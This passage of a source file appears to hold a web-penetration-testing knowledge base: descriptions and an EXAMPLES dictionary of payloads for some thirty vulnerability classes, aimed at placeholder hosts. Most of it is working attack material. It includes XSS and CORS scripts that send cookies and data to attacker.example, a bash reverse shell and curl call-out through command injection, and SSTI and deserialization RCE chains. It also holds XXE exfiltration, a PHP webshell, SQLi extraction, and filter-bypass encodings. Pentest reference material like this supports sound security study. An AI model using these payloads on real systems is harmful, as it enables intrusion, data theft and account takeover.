"basic": "Intercept the WebSocket handshake and messages (Burp's WebSocket history/repeater). Read the message format and replay/tamper messages. Test authorization: can you send messages or subscribe to channels/objects you shouldn't (IDOR over a channel/user id)? Check whether messages are validated like normal input (try injection payloads).",
"advanced": "**CSWSH**: if the handshake authenticates via cookies and doesn't validate `Origin` or use a CSRF token, a malicious page can open a socket as the victim and read/inject messages — account/data compromise. Inject XSS/SQLi/command payloads through message fields that hit unvalidated sinks. Abuse message-level authz (send admin actions). Race/flood for logic abuse.",
"bypass": "Origin checks that only block known-bad, accept `null`, or substring-match are bypassable (see CORS-style tricks). Where messages are validated server-side but the HTTP API isn't (or vice-versa), pick the weaker path. Tamper protocol framing if a proxy parses it loosely. Reconnect/re-subscribe to dodge per-message rate limits.",
"automation": "Burp Suite (WebSocket history + Repeater + the **WebSocket Turbo Intruder** extension) drives handshake and message testing. **wsrepl**/** wscat** for scripted interaction. Build a small client to fuzz message fields. For CSWSH, craft a PoC HTML page that opens the socket cross-origin and exfiltrates messages to prove it.",
}),
("Cryptographic Failures", "crypto-failures", {
"overview": "Cryptographic failures (OWASP A02) are weaknesses in how data is protected in transit or at rest: missing/weak TLS, sensitive data sent or stored in clear, weak hashing of passwords, predictable randomness, ECB/IV reuse, padding-oracle-able modes, and homemade crypto. Often enables credential theft, token forgery, or data decryption rather than being exploited 'directly'.",
"basic": "Check transport: is TLS enforced everywhere (HSTS), are there mixed-content/HTTP endpoints, weak protocol/cipher support (test with testssl.sh)? Look for sensitive data in clear (URLs, logs, local storage, responses). Inspect tokens/cookies for structure and entropy. Identify password hashing (fast MD5/SHA vs bcrypt/argon2) where observable.",
"advanced": "**Padding oracle** (CBC) to decrypt/forge ciphertext when the app reveals padding-validity differences. **ECB** patterns (identical blocks) enabling cut-and-paste forgery. **IV/nonce reuse** (CTR/GCM) leaking plaintext or breaking integrity. Predictable PRNG for tokens/reset codes → prediction. Length-extension on `H(secret‖data)` MACs (use HMAC). Hash cracking of leaked weak hashes. Static/hardcoded keys.",
"bypass": "These attacks *are* the bypass of the crypto control: a padding oracle decrypts without the key; ECB cut-and-paste forges authenticated blobs; length-extension forges MACs without the secret; weak randomness lets you predict 'unguessable' tokens. Downgrade attacks force weaker protocols/ciphers. Reuse of keys/IVs across contexts enables cross-decryption.",
"automation": "**testssl.sh**/**sslscan**/**nmap ssl-enum-ciphers** for TLS posture; **PadBuster**/**padding-oracle-attacker** for CBC oracles; **hashcat**/**john** for cracking; **hash_extender** for length extension; **CyberChef** for analysis. Burp scanner flags clear-text and weak-token issues. Confirm exploitability (a real oracle, a crackable hash) rather than reporting a scanner's protocol nitpick.",
}),
]


# Concrete worked example appended to each section. Targets are ALWAYS
# documentation placeholders — example.com/.org (RFC 2606), RFC 5737 TEST-NET
# ranges (192.0.2.x / 198.51.100.x / 203.0.113.x), 127.0.0.1, attacker.example,
# and the well-known cloud-metadata IP 169.254.169.254 — never a real target.
EXAMPLES = {
"xss": {
"overview": "A comment field stores input unescaped; an attacker posts `<script>fetch('https://attacker.example/c?'+document.cookie)</script>` on example.com. Every visitor who views the comment ships their session cookie to attacker.example (stored XSS -> account takeover).",
"basic": "Search box reflects the query:\n  GET https://example.com/search?q=<script>alert(document.domain)</script>\nThe alert popping `example.com` confirms script execution. Attribute context instead: `?q=\"><svg onload=alert(1)>`.",
"advanced": "Steal an anti-CSRF token then act as the victim:\n  <img src=x onerror=\"fetch('/account',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://attacker.example/x?'+encodeURIComponent(t.match(/csrf=([^&\"]+)/)[1])))\">",
"bypass": "WAF blocks `<script>` and `onerror`:\n  `<svg/OnLoad=confirm`1`>`  (case-varied handler, backtick call, no spaces)\n  or `<img src=x oNeRrOr=eval(atob('YWxlcnQoMSk='))>`  (base64 `alert(1)`).",
"automation": "  dalfox url 'https://example.com/search?q=FUZZ'\n  echo 'https://example.com/?q=test' | gxss\nBurp DOM Invader traces source->sink for DOM XSS live.",
},
"sqli": {
"overview": "A login query `SELECT * FROM users WHERE name='$u' AND pass='$p'` is bypassed with username `admin'-- -`, commenting out the password check and logging in as admin on example.com.",
"basic": "Confirm + extract column count and data:\n  https://example.com/item?id=1' ORDER BY 5-- -      (errors at the column count)\n  https://example.com/item?id=-1' UNION SELECT 1,version(),user(),4,5-- -",
"advanced": "Blind time-based extraction of the admin hash, one char at a time:\n  id=1' AND IF(SUBSTRING((SELECT pass FROM users WHERE name='admin'),1,1)='a',SLEEP(5),0)-- -\nResponse delays by 5s when the guessed char is right.",
"bypass": "Filter strips spaces and `UNION`:\n  id=1/**/UN/**/ION/**/SE/**/LECT/**/1,2,3-- -\n  or use MySQL versioned comments: `/*!50000UNION*/ /*!50000SELECT*/`.",
"automation": "  sqlmap -u 'https://example.com/item?id=1' --batch --dbs\n  sqlmap -r request.txt --level 5 --risk 3 --tamper space2comment,between",
},
"nosqli": {
"overview": "A MongoDB login does `db.users.find({user:req.body.user, pass:req.body.pass})`. Sending JSON `{\"user\":\"admin\",\"pass\":{\"$ne\":1}}` to example.com makes the password match anything -> logged in as admin.",
"basic": "URL-encoded operator injection on the login form:\n  POST https://example.com/login\n  user[$ne]=x&pass[$ne]=x      (both always true -> auth bypass)",
"advanced": "Blind password extraction via $regex oracle:\n  {\"user\":\"admin\",\"pass\":{\"$regex\":\"^s\"}}  -> login succeeds -> first char is 's'. Repeat ^sa, ^sb ... to recover the full value.",
"bypass": "If `$where` strings are filtered, fall back to operator-only oracles:\n  {\"pass\":{\"$gt\":\"\"}}  (matches any non-empty)  or  {\"id\":{\"$in\":[1,2,3]}}.",
"automation": "  nosqlmap  (interactive: target https://example.com/login, auth-bypass + blind extraction)\n  or a custom $regex bruteforce script around the true/false oracle.",
},
"cmdi": {
"overview": "A 'ping host' tool runs `ping -c1 $host`. Submitting `127.0.0.1; id` on example.com returns `uid=33(www-data)...` in the output -- arbitrary commands as the web user.",
"basic": "Try separators on a lookup field:\n  https://example.com/ping?host=127.0.0.1%3Bid\n  https://example.com/ping?host=127.0.0.1%7Cwhoami        (| whoami)",
"advanced": "Blind, confirmed out-of-band, then a reverse shell:\n  host=127.0.0.1;curl http://attacker.example/$(whoami)\n  host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1'",
"bypass": "Spaces/keywords filtered:\n  cat${IFS}/etc/passwd        (IFS instead of space)\n  w'h'o'am'i  or  /bin/c?t /etc/passwd        (quotes / wildcards dodge blacklists).",
"automation": "  commix --url='https://example.com/ping?host=127.0.0.1' -p host\n  catch blind hits with an interactsh / Collaborator listener.",
},
"code-injection": {
"overview": "A PHP 'calculator' does `eval(\"return $expr;\")`. Sending `expr=system('id')//` on example.com runs `id` -- code execution in the app runtime.",
"basic": "Probe for evaluation:\n  https://example.com/calc?expr=7*7      -> 49 means the input is evaluated\n  Python sink: `__import__('os').system('id')`  Node: `process.mainModule.require('child_process').execSync('id')`.",
"advanced": "Escape a Python sandbox via the object graph:\n  ().__class__.__bases__[0].__subclasses__()[INDEX]('id',shell=True)\nfinding the subprocess/Popen class index, then run commands.",
"bypass": "Blocked `system`/`exec` names:\n  globals()['__bui'+'ltins__']['ev'+'al']('...')\n  or PHP `assert($_GET['x'])` reached via a string-built call.",
"automation": "  tplmap -u 'https://example.com/page?inj=*'      (also covers template->code injection)\n  ysoserial / phpggc for deserialization-backed code exec.",
},
"ssti": {
"overview": "A 'custom greeting' renders `Hello {{name}}` server-side. Setting name to `{{7*7}}` on example.com returns `Hello 49`; `{{config}}` then leaks secrets -- and the engine reaches RCE.",
"basic": "Identify the engine with a polyglot, then arithmetic:\n  https://example.com/greet?name=${{<%[%'\"}}%\\\n  {{7*7}}->49 (Jinja2/Twig)   {{7*'7'}}->7777777 (Jinja2) vs 49 (Twig).",
"advanced": "Jinja2 RCE:\n  {{ cycler.__init__.__globals__.os.popen('id').read() }}\nFreemarker RCE:\n  <#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}",
"bypass": "Dotted-attribute filter:\n  {{ ''['__cl'+'ass__'] }}   or   {{ request|attr('application') }}\n  reach objects via brackets/`attr()`/concatenation.",
"automation": "  tplmap -u 'https://example.com/greet?name=*'\n  sstimap -u 'https://example.com/greet?name=*' --os-shell",
},
"ssrf": {
"overview": "An 'import from URL' feature fetches whatever URL you give it. Pointing it at `http://169.254.169.254/latest/meta-data/iam/security-credentials/` makes example.com's server return cloud credentials to you.",
"basic": "Confirm the fetch, then reach internals:\n  https://example.com/fetch?url=http://attacker.example/ping     (your log gets a hit)\n  url=http://127.0.0.1:8080/   url=http://169.254.169.254/latest/meta-data/",
"advanced": "Forge a Redis command via gopher to get RCE on an internal host:\n  url=gopher://127.0.0.1:6379/_<URL-encoded SET/CONFIG payload writing a cron/webshell>\n  Read files: url=file:///etc/passwd",
"bypass": "Allowlist of *.example.com only:\n  url=http://169.254.169.254%23.example.com   url=http://example.com@127.0.0.1/\n  decimal IP: url=http://2130706433/  (=127.0.0.1).",
"automation": "  ssrfmap -r request.txt -p url -m readfiles,portscan\n  gopherus --exploit redis      (builds the gopher payload).",
},
"xxe": {
"overview": "An XML upload is parsed with entity resolution on. The document `<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>` posted to example.com returns the contents of /etc/passwd.",
"basic": "Inline file read where a value is reflected:\n  <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>\n  <data><name>&xxe;</name></data>",
"advanced": "Blind out-of-band exfiltration via an external DTD on attacker.example:\n  <!DOCTYPE r [<!ENTITY % p SYSTEM \"http://attacker.example/e.dtd\"> %p;]>\n  e.dtd: <!ENTITY % f SYSTEM \"file:///etc/passwd\"><!ENTITY % x \"<!ENTITY e SYSTEM 'http://attacker.example/?%f;'>\">%x;",
"bypass": "DOCTYPE blocked -> XInclude:\n  <data xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></data>",
"automation": "  python XXEinjector.py --host=attacker.example --file=request.txt\n  Burp scanner + Collaborator detect blind XXE automatically.",
},
"csrf": {
"overview": "example.com's email-change endpoint accepts a cookie-authed POST with no token. An attacker page auto-submits it, so any logged-in victim who opens the page silently changes their account email to the attacker's.",
"basic": "Auto-submitting PoC hosted on attacker.example:\n  <form action=\"https://example.com/account/email\" method=POST>\n   <input name=email value=attacker@attacker.example></form><script>document.forms[0].submit()</script>",
"advanced": "Chain to takeover: CSRF the email change above, then trigger 'forgot password' -- the reset link now goes to the attacker's mailbox.",
"bypass": "Token only checked when present:\n  drop the `csrf` parameter entirely, or send an empty `csrf=` -- some apps skip validation. Or switch POST->GET if both are accepted.",
"automation": "  Burp -> right-click request -> Engagement tools -> Generate CSRF PoC.\n  Burp scanner flags missing/again-usable tokens.",
},
"idor": {
"overview": "Invoices load via `GET https://example.com/api/invoice/1024`. Changing 1024 to 1023 returns another customer's invoice -- no ownership check (BOLA).",
"basic": "With two accounts, replay account A's request as account B:\n  GET https://example.com/api/users/1001/profile        (try 1000, 1002, ...)\n  Test every verb: GET (read), PUT (edit), DELETE.",
"advanced": "Non-numeric id leaked elsewhere:\n  a base64 id `eyJpZCI6MTAwMX0=` ({\"id\":1001}) -- decode, increment, re-encode to reach other objects, or use a UUID found in an export/email.",
"bypass": "Direct swap blocked -> alternate forms:\n  id[]=1023 (array)   id=1024&id=1023 (parameter pollution)   or send the victim id in a trusted header: X-User-Id: 1023.",
"automation": "  Burp Autorize: log in as a low-priv user, browse as admin -- it flags requests that still succeed.\n  ffuf to enumerate /api/invoice/FUZZ over a numeric range, diffing sizes.",
},
"access-control": {
"overview": "The admin panel link is hidden in the UI for normal users, but `GET https://example.com/admin/users` returns the page anyway -- the server never checks the role (function-level access control missing).",
"basic": "Force-browse and downgrade:\n  reach https://example.com/admin/ as a normal user; tamper a role field `{\"role\":\"user\"}`->`\"admin\"`; remove the Authorization header on a 'protected' route.",
"advanced": "Method/version gap: the GET is protected but\n  PUT https://example.com/api/v1/users/1001 {\"role\":\"admin\"}\nisn't -- or /api/v2 enforces a check that /api/v1 forgot.",
"bypass": "Gateway path check defeated:\n  GET https://example.com/Admin/   (case)   /admin/..;/   /admin%2f\n  or header override:  X-Original-URL: /admin/users.",
"automation": "  Burp Autorize / AuthMatrix replay the full request set across roles + unauth and flag every access-control gap.\n  ffuf to discover hidden admin routes.",
},
"auth-bypass": {
"overview": "example.com's login does string-built SQL; submitting username `' OR 1=1-- -` logs you in as the first user without a password.",
"basic": "Try the classics:\n  default creds admin:admin; SQLi `admin'-- -`; observe whether 'user not found' vs 'wrong password' differs (username enumeration).",
"advanced": "SPA trusts a client value -- flip the response:\n  server returns {\"success\":false}; intercept and change to {\"success\":true,\"role\":\"admin\"}, or skip straight to the post-2FA endpoint.",
"bypass": "Type juggling on a JSON login:\n  {\"user\":\"admin\",\"pass\":[\"x\"]}  -- array vs string confuses a loose `==` check, or hits a different record via unicode-cased username.",
"automation": "  hydra -L users.txt -P pass.txt example.com https-post-form '/login:user=^USER^&pass=^PASS^:Invalid'\n  nuclei default-login + auth-bypass templates.",
},
"brute-force": {
"overview": "example.com has no rate limit on login. A list of common passwords against the user `admin` finds `Summer2024!` in seconds -> account access.",
"basic": "Enumerate users first (error/timing diff), then attack the confirmed ones:\n  ffuf -w pass.txt -X POST -d 'user=admin&pass=FUZZ' -u https://example.com/login -fr 'Invalid'",
"advanced": "Password spraying to dodge lockout -- one password across all users per round:\n  for each user in users.txt: try 'Welcome1', wait out the window, then 'Spring2024!'.",
"bypass": "Rate limit keyed on X-Forwarded-For:\n  rotate the header per request -- `X-Forwarded-For: 198.51.100.<n>` -- to reset the per-IP counter.",
"automation": "  hydra -l admin -P rockyou.txt example.com https-form-post ...\n  ffuf / Burp Intruder with response-length/status diffing to spot the hit.",
},
"session": {
"overview": "example.com's session cookie `SID=1001-1700000000` is sequential+timestamped, so an attacker predicts a valid neighbour's SID and rides their session.",
"basic": "Inspect the cookie's flags + lifetime:\n  Set-Cookie: SID=abc; (missing HttpOnly, Secure, SameSite). Then log out and replay the old SID -- if it still works, sessions aren't invalidated.",
"advanced": "Session fixation:\n  set SID=attacker_known before the victim logs in at example.com; if it isn't rotated on login, you now share their authenticated session.",
"bypass": "Logout only clears the cookie client-side:\n  capture SID before logout, replay it afterward -- the server still accepts it. Weak SameSite=None also enables cross-site use.",
"automation": "  Burp Sequencer to measure SID entropy; a small script to replay an old token post-logout and confirm rotation-on-login.",
},
"jwt": {
"overview": "example.com accepts a JWT whose header is changed to `{\"alg\":\"none\"}` with the signature stripped -- editing the payload to `{\"user\":\"admin\"}` grants admin.",
"basic": "Decode and tamper:\n  header.payload.signature -> base64url-decode payload, set `\"role\":\"admin\"`; try alg:none (drop the signature) and replay an expired token.",
"advanced": "RS256->HS256 algorithm confusion:\n  re-sign the forged token with HMAC-SHA256 using example.com's PUBLIC key as the secret -- the server verifies it as valid.",
"bypass": "Weak HS256 secret -> crack offline:\n  hashcat -m 16500 token.jwt wordlist.txt -> recover the key, then sign any claims you want.",
"automation": "  python jwt_tool.py <token> -M at        (all-tests: alg:none, key confusion, kid/jku)\n  hashcat -m 16500 for secret cracking.",
},
"oauth-sso": {
"overview": "example.com's OAuth callback loosely matches redirect_uri. Setting `redirect_uri=https://attacker.example` leaks the victim's authorization `code` to the attacker -> account takeover.",
"basic": "Tamper the flow params:\n  GET https://example.com/oauth/authorize?client_id=...&redirect_uri=https://attacker.example&state=...\n  check whether `state` is validated (CSRF on callback) and whether the code is single-use.",
"advanced": "SAML signature stripping (XSW): capture the SAML Response, alter the NameID/attributes, and remove or wrap the signature so the SP accepts a forged assertion as another user.",
"bypass": "redirect_uri allowlist evasion:\n  redirect_uri=https://example.com.attacker.example   or  https://example.com@attacker.example   or append /../ to reach an open redirect.",
"automation": "  Burp + SAML Raider extension (sign/strip/XSW assertions); EsPReSSO for SSO request analysis.",
},
"file-upload": {
"overview": "An avatar uploader on example.com saves files to a web-reachable dir without checks. Uploading `shell.php` (`<?php system($_GET['c']);?>`) then visiting it gives `?c=id` -> RCE.",
"basic": "Upload a webshell, find its URL:\n  POST https://example.com/upload  (file=shell.php)\n  then GET https://example.com/uploads/shell.php?c=whoami",
"advanced": "Make a benign extension execute by uploading an .htaccess:\n  AddType application/x-httpd-php .jpg\n  then upload `shell.jpg` containing PHP. Or SVG upload -> stored XSS/XXE.",
"bypass": "Extension/content-type filters:\n  shell.php.jpg, shell.pHp, shell.phtml; spoof `Content-Type: image/png` while the body is PHP; prepend `GIF89a;` to pass magic-byte checks.",
"automation": "  Burp 'Upload Scanner' extension permutes extensions/content-types; then ffuf to locate the stored path.",
},
"lfi": {
"overview": "example.com renders `?page=` by include()-ing the value. `?page=../../../../etc/passwd` returns the password file; `php://filter` then leaks source.",
"basic": "Read a known file:\n  https://example.com/index.php?page=../../../../etc/passwd\n  https://example.com/?page=php://filter/convert.base64-encode/resource=config",
"advanced": "LFI->RCE via log poisoning:\n  send `<?php system($_GET['c']);?>` in the User-Agent (logged), then\n  ?page=/var/log/apache2/access.log&c=id",
"bypass": "Appended `.php` extension or filtered `../`:\n  ?page=php://filter/.../resource=index   (no extension needed)\n  ?page=....//....//etc/passwd   or  %252e%252e%252f (double-encoded).",
"automation": "  python liffy.py https://example.com/?page=   (wrappers + log poisoning)\n  ffuf -w lfi.txt -u 'https://example.com/?page=FUZZ'.",
},
"rfi": {
"overview": "example.com includes a remote URL. `?page=http://attacker.example/shell.txt` (holding PHP) executes the attacker's code on the server -- direct RCE.",
"basic": "Point the include at your server:\n  https://example.com/?page=http://attacker.example/shell.txt\n  shell.txt: <?php system($_GET['c']); ?>   then add &c=id",
"advanced": "Inline the payload with a data wrapper when remote URLs work:\n  ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
"bypass": "Appended `.php`:\n  ?page=http://attacker.example/shell.txt?    (the suffix becomes a query string)\n  filtered http:// -> try ftp:// or the data:// wrapper.",
"automation": "  python fimap.py -u 'https://example.com/?page=http://attacker.example/x'\n  serve the payload with `python3 -m http.server` + an interactsh listener.",
},
"path-traversal": {
"overview": "A download endpoint serves `?file=` from a folder. `?file=../../../../etc/passwd` on example.com escapes it and returns arbitrary files (source, config, keys).",
"basic": "Climb out of the base directory:\n  https://example.com/download?file=../../../../etc/passwd\n  Windows: ?file=..\\..\\..\\windows\\win.ini",
"advanced": "Read source/secrets, then escalate:\n  ?file=../../../../var/www/example/.env   (DB creds, API keys)\n  ?file=../../../../home/app/.ssh/id_rsa",
"bypass": "Filtered `../`:\n  ....//....//etc/passwd   ..%2f..%2f   %252e%252e%252f (double-encode)   ..%c0%af (overlong UTF-8).",
"automation": "  dotdotpwn -m http-url -u 'https://example.com/download?file=TRAVERSAL'\n  ffuf -w traversal.txt -u 'https://example.com/download?file=FUZZ'.",
},
"open-redirect": {
"overview": "After login, example.com redirects to `?next=`. `?next=https://attacker.example/login` sends the user to a look-alike phishing page on a link that started at the trusted domain.",
"basic": "Set the redirect target external:\n  https://example.com/login?next=https://attacker.example\n  watch for a 302 Location: https://attacker.example or a JS location change.",
"advanced": "Chain to steal an OAuth code:\n  use the open redirect as the OAuth redirect_uri so the `code` is forwarded to attacker.example.",
"bypass": "Allowlist/substring checks:\n  next=//attacker.example   next=https://example.com.attacker.example   next=https://attacker.example#example.com   next=https:/\\attacker.example",
"automation": "  cat urls.txt | gf redirect | openredirex -p payloads.txt\n  oralyzer -u 'https://example.com/login?next=FUZZ'.",
},
"host-header": {
"overview": "example.com builds password-reset links from the Host header. Sending `Host: attacker.example` poisons the reset link, so the victim's reset token lands on attacker.example -> takeover.",
"basic": "Flip the header and watch where it surfaces:\n  POST https://example.com/reset  with  Host: attacker.example  (or X-Forwarded-Host: attacker.example)\n  inspect the reset email's link.",
"advanced": "Cache poisoning: if X-Forwarded-Host is reflected and cached, poison it so every user is served a link/script pointing at attacker.example.",
"bypass": "Host validated -> try alternates:\n  X-Forwarded-Host: attacker.example   X-Host: attacker.example   or a duplicate Host header / absolute request line.",
"automation": "  Burp Param Miner ('Guess headers') tests Host/forwarding headers for reflection and cache poisoning.",
},
"request-smuggling": {
"overview": "A front-end proxy and back-end disagree on request length (CL.TE). The attacker prepends bytes to the next visitor's request to example.com, hijacking it or bypassing the front-end's auth.",
"basic": "Send a CL.TE probe and watch for a timeout/desync:\n  POST / HTTP/1.1 ... Content-Length: 6 / Transfer-Encoding: chunked / 0 / G\n  (the trailing 'G' poisons the next request).",
"advanced": "Capture another user's request by smuggling a prefix that makes the back-end append their headers (cookies, CSRF token) into a stored/reflected field you can read.",
"bypass": "Front-end normalises TE -> obfuscate it (TE.TE):\n  Transfer-Encoding:[tab]chunked   or a duplicated `Transfer-Encoding: chunked` + `Transfer-Encoding: x`.",
"automation": "  Burp 'HTTP Request Smuggler' extension (detect + exploit, incl. HTTP/2 desync); smuggler.py for CLI scanning.",
},
"crlf": {
"overview": "example.com reflects `?url=` into the Location header. `?url=%0d%0aSet-Cookie:%20sid=evil` injects a header, splitting the response to set a cookie or inject content.",
"basic": "Inject into a redirect/header param:\n  https://example.com/go?url=%0d%0aSet-Cookie:%20x=1\n  check whether a new `Set-Cookie: x=1` appears in the response.",
"advanced": "Response splitting -> reflected XSS / cache poisoning:\n  ?url=%0d%0a%0d%0a<html><script>alert(document.domain)</script>  delivered as a whole injected body.",
"bypass": "Filtered `%0d%0a`:\n  %0a alone, or double-encode %250d%250a, or unicode line separators.",
"automation": "  crlfuzz -u 'https://example.com/go?url=FUZZ'\n  cat urls.txt | gf redirect | crlfsuite.",
},
"deserialization": {
"overview": "example.com stores a base64 PHP object in a cookie. Tampering an `isAdmin` property (`O:4:\"User\":1:{s:7:\"isAdmin\";b:1;}`) and re-sending it grants admin -- or a gadget chain yields RCE.",
"basic": "Spot and tamper the blob:\n  Java `rO0AB...` / PHP `O:4:\"User\"...` in a cookie/hidden field -- flip a trusted property and resend to test if it's deserialised.",
"advanced": "RCE via a gadget chain:\n  ysoserial CommonsCollections6 'curl http://attacker.example/`whoami`' | base64  -> paste into the serialized parameter; confirm the out-of-band hit.",
"bypass": "Name/byte filters -> PHAR:\n  smuggle a PHP object through a filesystem function on a `phar://path` so the magic bytes never appear in the request.",
"automation": "  ysoserial / ysoserial.net / phpggc generate the chains;\n  Burp 'Java Deserialization Scanner' / Freddy detect + exploit.",
},
"xpath": {
"overview": "example.com authenticates against XML with `//user[name='$u' and pass='$p']`. Username `' or '1'='1` makes the filter always true -> logged in.",
"basic": "Break the filter:\n  POST https://example.com/login  user=' or '1'='1   pass=x\n  watch for login success / more results returned.",
"advanced": "Blind extraction of the admin password char-by-char:\n  user=admin' and substring(//user[1]/pass,1,1)='a   (true/false oracle on the login result).",
"bypass": "Quotes filtered -> use functions / position predicates:\n  ...and starts-with(//user[1]/pass,'s')   or  //user[position()=1].",
"automation": "  xcat run https://example.com/login --true-string 'Welcome'  (automated blind XPath extraction).",
},
"ldap": {
"overview": "example.com's directory login builds `(uid=$u)`. Submitting `*)(uid=*))(|(uid=*` breaks the filter so it matches everyone -> auth bypass.",
"basic": "Wildcard / breakout:\n  user=*        (matches all)\n  user=admin)(&)        (always-true filter injection).",
"advanced": "Blind attribute extraction with wildcards:\n  user=admin)(description=A*   -> true/false on result count recovers the attribute char by char.",
"bypass": "Partial metachar filtering -- use what's left:\n  `*` alone is powerful; escape variants like `\\2a` for `*`; move the injection to the unchecked password clause.",
"automation": "  Burp Intruder / wfuzz fuzzing `*()|&` payloads with result-count diffing; a custom wildcard oracle for blind extraction.",
},
"clickjacking": {
"overview": "example.com lacks frame protections. An attacker frames its 'Delete account' page transparently over a 'Win a prize' button on attacker.example; the victim's click deletes their account.",
"basic": "Test framability:\n  <iframe src=\"https://example.com/account/delete\" style=\"opacity:.0001\"></iframe>\n  if it renders, X-Frame-Options / CSP frame-ancestors is missing.",
"advanced": "Overlay a decoy and pre-fill inputs:\n  position the hidden iframe so a sensitive control sits under a visible 'Continue' button; use ?param= to pre-set form values before the click.",
"bypass": "Frame-busting JS defeated by the sandbox attribute:\n  <iframe sandbox=\"allow-forms allow-scripts\" src=\"https://example.com/...\"></iframe>  blocks top.location.",
"automation": "  Nuclei / Burp flag missing framing headers; a quick PoC HTML generator builds the overlay.",
},
"cors": {
"overview": "example.com reflects the Origin and sets credentials true. A page on attacker.example does `fetch('https://example.com/api/me',{credentials:'include'})` and reads the victim's private data.",
"basic": "Probe the CORS headers:\n  curl -H 'Origin: https://attacker.example' https://example.com/api/me -I\n  if it returns ACAO: https://attacker.example + ACAC: true, it's exploitable.",
"advanced": "Exfil PoC on attacker.example:\n  fetch('https://example.com/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.example/x?'+btoa(d)))",
"bypass": "Allowlist tricks:\n  Origin: https://example.com.attacker.example   or  Origin: null (exploited via a sandboxed iframe).",
"automation": "  corsy -u https://example.com   or  CORScanner -u https://example.com  (tests reflection/null/credential combos).",
},
"cache-poisoning": {
"overview": "example.com reflects X-Forwarded-Host (unkeyed) into a cached script tag. Poisoning it makes the CDN serve `<script src=//attacker.example/x.js>` to every subsequent visitor.",
"basic": "Find an unkeyed input:\n  GET https://example.com/  with  X-Forwarded-Host: attacker.example  (add a cache-buster ?cb=1)\n  then re-request clean and check X-Cache: hit returns your payload.",
"advanced": "Cache deception -- store a victim's private page as a static asset:\n  GET https://example.com/account/profile.css   if the cache stores it, fetch it unauthenticated to read their data.",
"bypass": "Reach the cache despite normalisation:\n  vary delimiters the cache and origin parse differently (`;`, encoded `/`), or parameter-cloak a keyed param.",
"automation": "  Burp Param Miner (unkeyed header/param discovery) and Web Cache Vulnerability Scanner (WCVS).",
},
"race-conditions": {
"overview": "A $10 gift card on example.com can be redeemed once -- but firing 30 redeem requests simultaneously credits the balance many times before the check commits.",
"basic": "Send a limited action as a parallel group:\n  POST https://example.com/redeem {\"code\":\"GIFT10\"}  x30 at once (Burp 'send group in parallel') -> check for >1 redemption.",
"advanced": "Single-packet attack (HTTP/2) to land ~30 requests in ~1ms and beat a tight window -- e.g. withdraw beyond balance, or brute a one-time OTP with no per-attempt commit.",
"bypass": "Tighten timing with Turbo Intruder's single-packet attack to remove network jitter; warm the connection so all requests arrive together.",
"automation": "  Burp Turbo Intruder (race-single-packet template) or Repeater 'Send group (parallel)'.",
},
"business-logic": {
"overview": "example.com's checkout trusts the client-sent total. Setting `quantity=-1` (or `price=0`) in the cart request reduces the total or yields a refund -- value extracted with no injection.",
"basic": "Break an assumption in the flow:\n  POST https://example.com/cart {\"item\":42,\"qty\":-1}\n  or replay the final 'confirm' step without paying; reuse a one-time coupon twice.",
"advanced": "Stack the flaws:\n  apply the same 50%-off coupon repeatedly, or pay $0 then call /order/confirm directly -- the server checks each step independently.",
"bypass": "No signature to defeat -- the gap is the unguarded assumption: validation only in the UI, a check on step 1 but not step 3, or the server recomputing from a client-supplied subtotal.",
"automation": "  Burp Repeater/Intruder to tamper values; param miners to surface hidden fields (discount/role/tier).",
},
"info-disclosure": {
"overview": "example.com leaves `/.git/` exposed; dumping it reveals source, and the source contains a hard-coded AWS key -- a full secret leak from one misconfigured path.",
"basic": "Check the usual spots:\n  https://example.com/.git/HEAD   /.env   /server-status   /backup.zip\n  view-source + JS bundles (.js.map) for hard-coded keys; trigger errors for stack traces.",
"advanced": "Reconstruct and mine source:\n  git-dumper https://example.com/.git/ out/  -> grep for AWS_/api_key/JWT secrets and new endpoints; pull old content from the Wayback Machine.",
"bypass": "Blocked-by-extension file:\n  try case/alternate extensions, path traversal, or a stale CDN edge / Google cache copy of the protected artefact.",
"automation": "  trufflehog / gitleaks (secrets), LinkFinder / SecretFinder (JS), gau / waybackurls (historical URLs), nuclei exposure templates.",
},
"misconfiguration": {
"overview": "example.com exposes Spring Boot Actuator. `GET https://example.com/actuator/env` dumps environment variables (DB passwords, tokens); `/actuator/heapdump` can yield secrets/RCE.",
"basic": "Enumerate exposed surfaces:\n  https://example.com/actuator/  /debug  /console  ; default creds on an admin panel; directory listing; missing security headers.",
"advanced": "Exploit an exposed console:\n  /actuator/env + /actuator/heapdump for secrets; an open S3 bucket `https://example-bucket.s3.amazonaws.com/?list-type=2`; unauthenticated Kibana/Jenkins.",
"bypass": "Reach 'internal-only' management endpoints:\n  add  X-Forwarded-For: 127.0.0.1, use a staging vhost still in debug mode, or an API that lacks the UI's auth.",
"automation": "  nuclei -u https://example.com -t exposures/ ; testssl.sh; wafw00f; S3Scanner for open buckets.",
},
"subdomain-takeover": {
"overview": "`status.example.com` is a CNAME to a deprovisioned GitHub Pages site. The attacker claims that GitHub repo and serves content on status.example.com -- phishing on a trusted domain.",
"basic": "Resolve CNAMEs and match a takeover fingerprint:\n  dig CNAME status.example.com -> points to an external service returning 'There isn't a GitHub Pages site here.'",
"advanced": "Weaponise after claiming the resource:\n  host a page on status.example.com that sets/reads cookies scoped to .example.com, or capture an OAuth redirect allow-listed to *.example.com.",
"bypass": "Not a filter bypass -- the work is thorough discovery: passive+active enumeration and catching transient dangling records before they're cleaned up.",
"automation": "  subfinder -d example.com | dnsx -cname | nuclei -t takeovers/   (or subjack / subzy).",
},
"graphql": {
"overview": "example.com's /graphql allows introspection, leaking the whole schema; an admin mutation `deleteUser` is then callable directly because authorization is only on the gateway.",
"basic": "Dump the schema:\n  POST https://example.com/graphql {\"query\":\"{__schema{types{name fields{name}}}}\"}\n  then call sensitive queries/mutations directly.",
"advanced": "Batching to brute past rate limits:\n  { a:login(user:\"admin\",pass:\"p1\"){token} b:login(user:\"admin\",pass:\"p2\"){token} ... }  -- many attempts in one request.",
